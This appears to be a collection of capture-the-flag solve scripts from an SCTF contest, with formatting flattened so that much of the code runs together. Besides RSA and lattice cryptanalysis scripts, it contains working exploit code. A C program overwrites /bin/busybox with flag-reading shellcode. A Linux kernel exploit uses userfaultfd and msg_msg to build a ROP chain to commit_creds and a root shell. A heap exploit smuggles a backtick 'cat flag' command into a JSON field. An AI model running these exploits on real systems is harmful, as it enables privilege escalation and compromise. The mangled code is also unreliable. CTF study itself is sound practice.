import structimport base64inp = "SCTF{abcdefghijklmnopqrstuvwxyz12345678}"inp_enc = bytes.fromhex("9c3b2fb802f5fda366c98731faa28659c801e985146616805e11b573e6f63d26c09ca35c0a24cfdb")ori_enc = bytes.fromhex("33c0c8a3f3bf1d1a3b41b7c6f15e865252cf6b1ec5f9cbbfed7b62f1f7434854fb854cd93530f26e")inp_enc = ori_encinp_enc_dword = []for i in range(0, len(inp_enc), 4): inp_enc_dword.append(struct.unpack(">= 1 res |= 0x80000000else: res >>= 1 rd -= 1return resfor i in range(len(inp_enc_dword)): inp_enc_dword[i] = rev_crc(inp_enc_dword[i])xor_num = [185, 173, 127, 3, 159, 15, 241, 103, 121, 183, 57, 221, 147, 136, 174, 234, 176, 61, 122,7, 242, 137, 229, 52, 35, 85, 216, 78, 183, 218, 236, 113, 136, 108, 116, 39, 123, 101, 142, 245]inp_enc_byte = []for i in inp_enc_dword:
for j in range(4): inp_enc_byte.append((i >> j*8) & 0xff)for i in range(len(inp_enc_byte)): inp_enc_byte[i] ^= xor_num[i]for i in range(len(inp_enc_byte)): inp_enc_byte[i] ^= 30str1 = "".join(chr(i) for i in inp_enc_byte)string1 = "nopqrstDEFGHIJKLhijklUVQRST/WXYZabABCcdefgmuv6789+wxyz012345MNOP"string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))
# Y0u_@re_r1ght_r3ver53_is_easy!

#! sagemath
def attack(N,e): convergents = continued_fraction(ZZ(e) / ZZ(int( (1/2)*(N+sqrt(N)+1)**2+(1/2)*(N+3/4*sqrt(2)*sqrt(N)+1)**2+3/16*N ))).convergents()for c in convergents: k = c.numerator() d = c.denominator()if d.nbits()==254:
try: phi = ZZ(int( (e * d - int(1)) // k )) print(d) var('p q') print(solve([p*q==N,(p^2 + p + 1)*(q^2 + q + 1)==phi],p,q))
except:
continueelse:
continue

n = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840
attack(n,e)
from Crypto.Util.number import *from hashlib import md5
p = 5390597488072767109361706002186244359146023656052952666052036845964423888084380390710080004831930978524731104593204614023979740021938370218984226690661361q = 5984758006806378809956519900535567746479053908385004504598524889746027259134602871258417614666511624425382102292754198444334667792470478919346145707972191

bp = long_to_bytes(int(p))print(bp)FLAG = 'SCTF{'+md5(bp).hexdigest()+'}'print(FLAG)bp = long_to_bytes(int(q))print(bp)FLAG = 'SCTF{'+md5(bp).hexdigest()+'}'print(FLAG)

from random import choicesimport jsonfrom sage.all import *from Crypto.Util.number import *from sage.groups.perm_gps.permgroup_named import SymmetricGroup

# infowith open('output.txt', 'r') as f: data = json.loads(f.read()) AA = eval(data['AA']) b = eval(data['b'])with open('D.matrix', 'r') as f: data = json.loads(f.read()) D = eval(data['D'])with open('Old.matrix', 'r') as f: data = json.loads(f.read()) S = eval(data['S']) p = eval(data['p'])
from prob_info import Per, M, h, HP
# now get MP (this part is useless)mat = matrix(11, 10)mat[0] = HP + [0]mat[1] = h + [1000000]for i in range(9): mat[i + 2, i] = Mres = mat.LLL()for i in range(11):if res[i][-1] == 1000000: res = res[i]breakMP = [a + -b for a, b in zip(h, res[:-1])]

# now get AAA = Matrix(GF(65537), AA)D = Matrix(GF(65537), D)P = PermutationGroupElement(Per)PM = Matrix(GF(65537), P.matrix())DPM = D * PMA = AA * DPM.inverse()
# use part of A to recover sinfo_count = 100mat = matrix(25 + info_count + 1, info_count)for i in range(25):
for j in range(info_count): mat[i, j] = A[j, i]for i in range(info_count): mat[i + 25, i] = 65537mat[-1] = b[:
info_count]res = mat.LLL()
# print(res)res = res[25 + 1]print(res)
# recover ss = A[:25,:].inverse() * (vector(b[:25], GF(65537)) - res[:25])print(s)flag = sum(v * 65537**i for i, v in enumerate(map(int, s)))print(long_to_bytes(flag))

from cryptography.hazmat.backends import default_backendfrom cryptography.hazmat.primitives import serialization
# 读取并解析PEM格式的公钥
def load_pem_public_key(pem_data):
try: public_key = serialization.load_pem_public_key( pem_data.encode(), backend=default_backend() )return public_key
except Exception as e: print(f"Error loading PEM public key: {e}")return None
# 打印公钥信息
def print_public_key_info(public_key):
try:# 获取公钥的类型和公共数字 public_numbers = public_key.public_numbers() print(f"Public Key Type: {type(public_key).__name__}") print(f"Public Numbers: {public_numbers}") print(f"Modulus (n): {public_numbers.n}")
# len print(f"Modulus (n) length: {public_numbers.n.bit_length()}") print(f"Public Exponent (e): {public_numbers.e}") print(f"Public Exponent (e) length: {public_numbers.e.bit_length()}")
except Exception as e: print(f"Error printing public key info: {e}")
# 主函数
def main():
with open("/Whisper/cert1.pem", "r") as f:# with open("/Whisper/cert2.pem", "r") as f: pem_public_key = f.read()
# 加载 PEM 公钥 public_key = load_pem_public_key(pem_public_key)if public_key:# 打印公钥的信息 print_public_key_info(public_key)
if __name__ == "__main__": main()

from sage.all import *import mathimport itertools
# display matrix picture with 0 and X
# references: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage
def matrix_overview(BB):
for ii in range(BB.dimensions()[0]): a = ('%02d ' % ii)for jj in range(BB.dimensions()[1]): a += ' ' if BB[ii,jj] == 0 else 'X'if BB.dimensions()[0] < 60: a += ' ' print(a)
def dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt):''' Attack to Dual RSA: Liqiang et al.'s attack implementation
 References: [1] Liqiang Peng, Lei Hu, Yao Lu, Jun Xu and Zhangjie Huang. 2016. "Cryptanalysis of Dual RSA" ''' N = (n1+n2)/2 A = ZZ(floor(N^0.5))
 _XX = ZZ(floor(N^delta)) _YY = ZZ(floor(N^0.5)) _ZZ = ZZ(floor(N^(delta - 1./4))) _UU = _XX * _YY + 1
# Find a "good" basis satisfying d = a1 * l'11 + a2 * l'21 M = Matrix(ZZ, [[A, e], [0, n1]]) B = M.LLL() l11, l12 = B[0] l21, l22 = B[1] l_11 = ZZ(l11 / A) l_21 = ZZ(l21 / A)
 modulo = e * l_21 F = Zmod(modulo)
 PR = PolynomialRing(F, 'u, x, y, z') u, x, y, z = PR.gens()
 PK = PolynomialRing(ZZ, 'uk, xk, yk, zk') uk, xk, yk, zk = PK.gens()
# For transform xy to u-1 (unravelled linearlization) PQ = PK.quo(xk*yk+1-uk)
 f = PK(x*(n2 + y) - e*l_11*z + 1)
 fbar = PQ(f).lift()
# Polynomial construction gijk = {}
for k in range(0, mm + 1):
for i in range(0, mm-k + 1):
for j in range(0, mm-k-i + 1): gijk[i, j, k] = PQ(xk^i * zk^j * PK(fbar) ^ k * modulo^(mm-k)).lift()
 hjkl = {}
for j in range(1, tt + 1):
for k in range(floor(mm / tt) * j, mm + 1):
for l in range(0, k + 1): hjkl[j, k, l] = PQ(yk^j * zk^(k-l) * PK(fbar) ^ l * modulo^(mm-l)).lift()
 monomials = []for k in list(gijk.keys()): monomials += gijk[k].monomials()for k in list(hjkl.keys()): monomials += hjkl[k].monomials()
 monomials = sorted(set(monomials))[::-1]assert len(monomials) == len(gijk) + len(hjkl) # square matrix? dim = len(monomials)
# Create lattice from polynmial g_{ijk} and h_{jkl} M = Matrix(ZZ, dim) row = 0for k in list(gijk.keys()):
for i, monomial in enumerate(monomials): M[row, i] = gijk[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ) row += 1for k in list(hjkl.keys()):
for i, monomial in enumerate(monomials): M[row, i] = hjkl[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ) row += 1
 matrix_overview(M) print('=' * 128)
# LLL B = M.LLL()
 matrix_overview(B)
# Construct polynomials from reduced lattices H = [(i, 0) for i in range(dim)] H = dict(H)for j in range(dim):
for i in range(dim): H[i] += PK((monomials[j] * B[i, j]) / monomials[j].subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)) H = list(H.values())
 PQ = PolynomialRing(QQ, 'uq, xq, yq, zq') uq, xq, yq, zq = PQ.gens()
# Inversion of unravelled linearlizationfor i in range(dim): H[i] = PQ(H[i].subs(uk=xk*yk+1))
# Calculate Groebner basis for solve system of equations''' Actually, These polynomials selection (H[1:20]) is heuristic selection. Because they are "short" vectors. We need a short vector less than Howgrave-Graham bound. So we trying test parameter(at [1]) and decided it. ''' I = Ideal(*H[1:20]) g = I.groebner_basis('giac')[::-1] mon = [t.monomials() for t in g]
 PX = PolynomialRing(ZZ, 'xs') xs = PX.gen()
 x_pol = y_pol = z_pol = None
for i in range(len(g)):if mon[i] == [xq, 1]: print(g[i] / g[i].lc()) x_pol = g[i] / g[i].lc()elif mon[i] == [yq, 1]: print(g[i] / g[i].lc()) y_pol = g[i] / g[i].lc()elif mon[i] == [zq, 1]: print(g[i] / g[i].lc()) z_pol = g[i] / g[i].lc()
if x_pol is None or y_pol is None or z_pol is None: print('[-] Failed: we cannot get a solution...')return
 x0 = x_pol.subs(xq=xs).roots()[0][0] y0 = y_pol.subs(yq=xs).roots()[0][0] z0 = z_pol.subs(zq=xs).roots()[0][0]
# solution checkassert f(x0*y0+1, x0, y0, z0) % modulo == 0
 a0 = z0 a1 = (x0 * (n2 + y0) + 1 - e*l_11*z0) / (e*l_21)
 d = a0 * l_11 + a1 * l_21return d
if __name__ == '__main__':# In [1]: 345/1019
# Out[1]: 0.338567222767419 delta = 0.338 mm = 4 tt = 2
# n1 = alice_public_key.N1 n1 = 19216005446310864558409934096148904703198882317083224129431545386380435777354723744624028053518278514595663319253560114239018542660582960464010994454707936550902872627309424890333127288994449006783158078916602020794628546065674981593736606481809198149080696037584037699638293870122512237711498004090515845499
# n2 = alice_public_key.N2 n2 = 4992911943798277344804876549224813326447469267517432903838084455752417287982320183584988170455130118418117937196562948710115292838538880218156469801938645463822391931977946975012481667095710882823897026534267366981015926659114785262116088548568215969555191689632109516970297562458267207338397574333407150103
# e = alice_public_key.e e = 5352708372343813403035593638037107517373724079700735571091908193413083617555211472255125798199165859811237950085789893649651552088125747433480591652396404710788778815075048587264350078253899425987466937040099316084273123603046629945048298154353920118466252136326911019666012632927688983695457057246503276867
 d2 = dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt) print(f'[+] d = {d2}')
# Output:# d2 = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803

d2 = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803

from gmpy2 import invert, powmodfrom Crypto.Util.number import long_to_bytes
n1 = 19216005446310864558409934096148904703198882317083224129431545386380435777354723744624028053518278514595663319253560114239018542660582960464010994454707936550902872627309424890333127288994449006783158078916602020794628546065674981593736606481809198149080696037584037699638293870122512237711498004090515845499n2 = 4992911943798277344804876549224813326447469267517432903838084455752417287982320183584988170455130118418117937196562948710115292838538880218156469801938645463822391931977946975012481667095710882823897026534267366981015926659114785262116088548568215969555191689632109516970297562458267207338397574333407150103e = 5352708372343813403035593638037107517373724079700735571091908193413083617555211472255125798199165859811237950085789893649651552088125747433480591652396404710788778815075048587264350078253899425987466937040099316084273123603046629945048298154353920118466252136326911019666012632927688983695457057246503276867d = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803
# raw open cipherc_path = r'./ciphertext.txt'with open(c_path, 'rb') as f: c = f.read()
c_int = int.from_bytes(c, 'big')print(f'[+] c_int = {c_int}')m = powmod(c_int, d, n1)print(f'[+] m = {m}')print(f'[+] m = {long_to_bytes(m)}')

from gmpy2 import invert, powmodfrom Crypto.Util.number import long_to_bytes
n1 = 19216005446310864558409934096148904703198882317083224129431545386380435777354723744624028053518278514595663319253560114239018542660582960464010994454707936550902872627309424890333127288994449006783158078916602020794628546065674981593736606481809198149080696037584037699638293870122512237711498004090515845499n2 = 4992911943798277344804876549224813326447469267517432903838084455752417287982320183584988170455130118418117937196562948710115292838538880218156469801938645463822391931977946975012481667095710882823897026534267366981015926659114785262116088548568215969555191689632109516970297562458267207338397574333407150103e = 5352708372343813403035593638037107517373724079700735571091908193413083617555211472255125798199165859811237950085789893649651552088125747433480591652396404710788778815075048587264350078253899425987466937040099316084273123603046629945048298154353920118466252136326911019666012632927688983695457057246503276867d = 40938683537002969349994490030778320037535387924227183600857028517800996704376695290532584573854353589803
# raw open cipherc_path = r'./ciphertext.txt'with open(c_path, 'rb') as f: c = f.read()
c_int = int.from_bytes(c, 'big')print(f'[+] c_int = {c_int}')m = powmod(c_int, d, n1)print(f'[+] m = {m}')print(f'[+] m = {long_to_bytes(m)}')

import itertools#part2 bivariate copper
def small_roots(f, bounds, m=1, d=None):if not d: d = f.degree() print(d,m) R = f.base_ring() N = R.cardinality()
 f /= f.coefficients().pop(0) f = f.change_ring(ZZ)
 G = Sequence([], f.parent())for i in range(m + 1): base = N ^ (m - i) * f ^ ifor shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g)
 B, monomials = G.coefficient_matrix() monomials = vector(monomials)
 factors = [monomial(*bounds) for monomial in monomials]for i, factor in enumerate(factors): B.rescale_col(i, factor)
 B = B.dense_matrix().LLL()
 B = B.change_ring(QQ)for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor)
 H = Sequence([], f.parent().change_ring(QQ))for h in filter(None, B * monomials): H.append(h) I = H.ideal()if I.dimension() == -1: H.pop()elif I.dimension() == 0: roots = []for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root)return roots

p=0x8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc2743fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e57019400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
q=0xe4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4dac699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d964807170ff2c13c4eb8012ecab37862a3900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000n=0x67f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5PR.<y0,y1>=Zmod(n)[]f = (p+y0)^5*(q+y1)^2res = small_roots(f,bounds=(2^512,2^408), m=2,d=3 )print(res)'''[(6708022338172260347899030626323676022100749598842650911015897443511894444627151436951734224984454180375617062494685670914830207366629067809127120853621, 27120250680531856264005422077507994977725575176295502437617058870679375973489771046508673680604944356225907266192711870527)]'''

#include <stdio.h>#include <fcntl.h>#include #include <sys/types.h>
#define ATTACK_FILE "busybox"#define PAGE_SIZE 4096
int main(int argc, char **argv, char **env){int fd; system("chmod 777 /bin/busybox;cp /bin/busybox /busybox;");
unsigned char elfcode[] = {0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x68, 0x60, 0x66, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01,0x48, 0xb8, 0x2f, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x6c, 0x50, 0x6a,0x02, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x0f, 0x05, 0x41, 0xba, 0xff,0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x01, 0x5f,0x99, 0x0f, 0x05, 0xEB}; fd = open(ATTACK_FILE, O_RDWR | O_CREAT | O_TRUNC, 0666);if (fd < 0) { perror("Error opening file");
return 1; }
// 写入 ELF 代码到文件ssize_t bytes_written = write(fd, elfcode, sizeof(elfcode));if (bytes_written < 0) { perror("Error writing to file"); close(fd);
return 1; }
// 关闭文件 close(fd);printf("ELF code written to %s successfully.n", ATTACK_FILE); system("cp /busybox /bin/busybox;");
return 0;}

#define _GNU_SOURCE#include <fcntl.h>#include #include <stdio.h>#include <stdlib.h>#include <sys/msg.h>#include <sys/syscall.h>#include <linux/userfaultfd.h>#include #include <sys/mman.h>#include <sys/ioctl.h>#include <semaphore.h>#include <sys/ipc.h>#include <stdint.h>
#define COLOR_GREEN " 33[32m"#define COLOR_RED " 33[31m"#define COLOR_YELLOW " 33[33m"#define COLOR_DEFAULT " 33[0m"
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "n", __FILE__, __LINE__, ##__VA_ARGS__)#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define die(fmt, ...) do { loge(fmt, ##__VA_ARGS__); loge("Exit at line %d", __LINE__); exit(1); } while (0)
void get_root_shell(void){if (getuid()) { die("Failed to get the root!"); }
puts("[*] Successful to get the root. Execve root shell now..."); system("/bin/sh");exit(0);}
size_t user_cs, user_ss, user_rflags, user_sp;
void saveUserState(){ __asm__("mov %cs,user_cs;""mov %ss,user_ss;""mov %rsp,user_sp;""pushf;""pop user_rflags;"); logi("[+] user states have been saved!!");}
#define PAGE_SIZE 0x1000
int fd = -1, flag = 0, msg_qid, pipe_fd[2];
char tmp_buf[0x30];
char buf[0x30];
char msg_buf[0x400 - 0x30];
char leak_buf[0x2000];
size_t kernel_base, prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode;
size_t ptr;
void bind_core(int core){cpu_set_t cpu_set;
 CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 logi("Process binded to core %dn", core);}
struct list_head{uint64_t next;
uint64_t prev;};
struct msg_msg{struct list_head m_list;
uint64_t m_type;
uint64_t m_ts;
uint64_t next;
uint64_t security;};
struct msg_msgseg{uint64_t next;};
/*struct msgbuf { long mtype; char mtext[0];};*/
int get_msg_queue(void){return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);}
int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp){return msgrcv(msqid, msgp, msgsz, msgtyp, 0);}
/** * the msgp should be a pointer to the `struct msgbuf`, * and the data should be stored in msgbuf.mtext */int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp){ *(long *)msgp = msgtyp;
return msgsnd(msqid, msgp, msgsz, 0);}
/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp){return msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);}
void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,uint64_t m_type, uint64_t m_ts, uint64_t next, uint64_t security){ msg->m_list.next = m_list_next; msg->m_list.prev = m_list_prev; msg->m_type = m_type; msg->m_ts = m_ts; msg->next = next; msg->security = security;}
void RegisterUserfault(void *fault_page, void *handler){pthread_t thr;
struct uffdio_api ua;
struct uffdio_register ur;
size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); ua.api = UFFD_API; ua.features = 0;if (ioctl(uffd, UFFDIO_API, &ua) == -1) die("[-] ioctl-UFFDIO_API");
 ur.range.start = (unsigned long)fault_page; // 我们要监视的区域 ur.range.len = 0x1000; ur.mode = UFFDIO_REGISTER_MODE_MISSING;if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) // 注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作 die("[-] ioctl-UFFDIO_REGISTER");// 开一个线程，接收错误的信号，然后处理int s = pthread_create(&thr, NULL, handler, (void *)uffd);if (s != 0) die("[-] pthread_create");}
static void *fault_handler_thread(void *arg){struct uffd_msg msg;
unsigned long uffd = (unsigned long)arg; logi("fault_handler_thread created");
int nready;
struct pollfd pollfd; pollfd.fd = uffd; pollfd.events = POLLIN; nready = poll(&pollfd, 1, -1);
if (nready != 1) { die("Wrong poll return val"); } nready = read(uffd, &msg, sizeof(msg));if (nready <= 0) { die("msg err"); }
// kfreememset(tmp_buf, 0x1, sizeof(tmp_buf)); *(size_t *)(tmp_buf + 0x28) = 0; ioctl(fd, 0xFFF1, tmp_buf);
memset(msg_buf, 0, sizeof(msg_buf));
int ret = write_msg(msg_qid, msg_buf, 0x400 - 0x30, 0x1337);if (ret < 0) { die("msgwrite"); }
char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);if (page == MAP_FAILED) { die("[-] mmap err"); }struct uffdio_copy uc;
// init pagememset(page, 0, sizeof(page)); *(size_t *)page = 0x1000; *(size_t *)(page + 0x8) = ptr + 0x300; *(size_t *)(page + 0x10) = 0;
 uc.src = (unsigned long)page; uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1); uc.len = 0x1000; uc.mode = 0; uc.copy = 0; ioctl(uffd, UFFDIO_COPY, &uc); logi("sleep3 handler1 done"); flag = 1;
return NULL;}
struct pipe_buffer{uint64_t page;
uint32_t offset, len;
uint64_t ops;
uint32_t flags;
uint32_t padding;
uint64_t private;};
struct pipe_buf_operations{uint64_t confirm;
uint64_t release;
uint64_t try_steal;
uint64_t get;};
void main(int argc, char **argv, char **env){ saveUserState(); bind_core(0);
char *uffd_buf_pwn;
 uffd_buf_pwn = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); RegisterUserfault(uffd_buf_pwn + 0x1000, fault_handler_thread);
 msg_qid = get_msg_queue();
 fd = open("/dev/ksctf", O_RDWR);if (fd < 0) { die("open /dev/ksctf error"); }
// kmallocmemset(tmp_buf, 0x1, sizeof(tmp_buf)); *(size_t *)(tmp_buf + 0x28) = buf; ioctl(fd, 0xFFF0, tmp_buf); ptr = *(size_t *)buf; logi("get ptr:%llx", *(size_t *)buf);
if (pipe(pipe_fd) < 0) die("failed to create pipe!");
// write something to activate itif (write(pipe_fd[1], "stas", 8) < 0) die("failed to write the pipe!");
 *(size_t *)(uffd_buf_pwn + 0xfe8) = 0; write(fd, uffd_buf_pwn + 0xfe8, 0x28);
do {/* code */ } while (flag == 0);memset(leak_buf, 0x0, sizeof(leak_buf));if (read_msg(msg_qid, leak_buf, 0x1000, 0x1337) < 0) { die("msgread"); }
 kernel_base = *(size_t *)(leak_buf + 0x400 - 0x30 + 0x18) - 0x101a740; logi("kernel_base:%llx", kernel_base); prepare_kernel_cred = kernel_base + 0x98140; commit_creds = kernel_base + 0x97d00; swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xc00a74;
memset(msg_buf, 0, sizeof(msg_buf));
size_t *rop_chain;
int idx = 0; rop_chain = (size_t *)&msg_buf[0x118]; rop_chain[idx++] = kernel_base + 0x448278; rop_chain[idx++] = kernel_base + 0x448278; // pop_rdi_ret rop_chain[idx++] = 0; rop_chain[idx++] = prepare_kernel_cred; rop_chain[idx++] = kernel_base + 0x25c18; rop_chain[idx++] = 0; // mov_rdi_rax;pop_rbx rop_chain[idx++] = commit_creds; // commit_creds rop_chain[idx++] = kernel_base + 0x448278 + 1; rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode + 49; rop_chain[idx++] = 0x0; rop_chain[idx++] = 0x0; rop_chain[idx++] = get_root_shell; rop_chain[idx++] = user_cs; rop_chain[idx++] = user_rflags; rop_chain[idx++] = user_sp; rop_chain[idx++] = user_ss;
 *(size_t *)(msg_buf + 0x100) = kernel_base + 0xab262a; // add rsp, 0x10; pop rbp; ret; *(size_t *)(msg_buf + 0x110) = ptr + 0x400 + 0x98 + 8; *(size_t *)(msg_buf + 0x198 + 0x10) = kernel_base + 0x599a34; // push rsi; pop rsp setxattr("/tmp/exp", "stas", msg_buf, 0x400, 0);
 close(pipe_fd[0]); close(pipe_fd[1]);}

#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *import jsoncontext(arch='amd64', os='linux', log_level='debug')
# use script modecli_script()
# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']

def add(username,lent,cont): json_str = '[{"task_type":0,"username":"{}","size":{},"content":"{}"}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() data[0]["size"] = lent data[0]["content"] = base64.b64encode(cont).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)
def show(username): json_str = '[{"task_type":1,"username":"{}","size":32,"content":"YWRtaW4="}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)
def free(username): json_str = '[{"task_type":2,"username":"{}","size":32,"content":"YGNhdCBmbGFnYA=="}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)
def gift(username): json_str = '[{"task_type":-1,"username":"{}","size":32,"content":"YGNhdCBmbGFnYA=="}]' data = json.loads(json_str) data[0]["username"] = base64.b64encode(username).decode() new_json_str = json.dumps(data) sla(b'Please input your tasks', new_json_str)

add(b'aa',0x60,b'a'*0x70)add(b'bb',0x60,b'b'*0x70)add(b'cc',0x60,b'c'*0x68+p64_ex(0x71))
add(b'dd',0x60,b'd'*0x70)add(b'ee',0x60,b'e'*0x70)add(b'ff',0x60,b'f'*0x70)
add(b'gg',0x60,b'g'*0x70)add(b'hh',0x60,b'h'*0x70)add(b'ii',0x60,b'i'*0x70)
sla(b'Please input your tasks', b'11')show(b'hh')ru(b'user content:nn')heap_base=u64_ex(r(8))-0x680log_address_ex2(heap_base)
free(b'bb')add(b'jj',0x60,p64_ex(heap_base)+b'a'*0x68)add(b'kk',0x60,p64_ex(heap_base)+b'a'*0x68)add(b'll',0x60,p64_ex(0)+p64_ex(0x5e1)+b'x00'*0x60)
